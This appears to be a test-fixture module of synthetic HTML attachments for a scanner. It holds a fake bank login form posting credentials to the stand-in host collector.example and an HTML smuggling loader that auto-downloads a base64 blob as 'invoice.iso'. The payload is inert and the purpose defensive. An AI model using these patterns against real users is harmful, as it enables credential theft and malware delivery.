// Synthetic HTML attachments (D02 T04 §2): a local login page, a smuggling loader and a harmless receipt. The loader's
// payload is random bytes in base64, inert: nothing here is a real program or a real site.
const payload = btoa(String.fromCharCode(...Array.from({ length: 12 * 1024 }, (_, i) => (i * 31 + 7) % 256)));

export const loginPage = `<!doctype html><html><body>
<h1>Fictional Bank sign in</h1>
<form action="https://collector.example/post" method="post">
  <input name="user"><input type="password" name="pass"><button>Sign in</button>
</form></body></html>`;

export const cardPage = `<html><body><form action="#"><input name="cardnumber" autocomplete="cc-number">
<input name="cvv"></form></body></html>`;

export const loader = `<html><body><p>Your document is downloading.</p><script>
var b = "${payload}";
var bytes = Uint8Array.from(atob(b), function (c) { return c.charCodeAt(0); });
var url = URL.createObjectURL(new Blob([bytes], { type: "application/octet-stream" }));
var a = document.createElement("a"); a.href = url; a.download = "invoice.iso"; document.body.appendChild(a); a.click();
</script></body></html>`;

export const receipt = `<html><body><h1>Receipt 77</h1><p>Paid R 12 400.00 on 1 October.</p>
<img src="data:image/png;base64,iVBORw0KGgo="></body></html>`;

export const iconOnly = `<html><body><img src="data:image/png;base64,${payload}"><p>Logo</p></body></html>`;
